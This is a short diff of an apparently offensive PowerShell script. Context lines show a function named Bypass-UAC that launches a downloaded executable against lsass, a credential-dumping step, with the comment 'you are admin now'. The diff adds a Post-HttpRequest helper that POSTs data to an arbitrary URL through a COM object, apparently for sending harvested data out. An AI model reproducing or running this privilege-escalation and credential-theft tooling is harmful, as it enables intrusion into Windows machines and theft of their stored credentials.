@@ -319,3 +319,13 @@ function Bypass-UAC ($scriptPath, $logDirectoryPath) {
 
     &$fileDownloaded "/C:C:\Windows\System32\cmd.exe /C $scriptPath\msdsc.exe lsass $logDirectoryPath Title (launch the script from here, you are admin now)"    
 }
+
+function Post-HttpRequest($url,$parameters) { 
+    $httpRequest = New-Object -ComObject Msxml2.XMLHTTP 
+    $httpRequest.open("POST", $url, $false) 
+    $httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
+    $httpRequest.setRequestHeader("Content-length", $parameters.length); 
+    $httpRequest.setRequestHeader("Connection", "close") 
+    $httpRequest.send($parameters) 
+    $httpRequest.responseText 
+} 
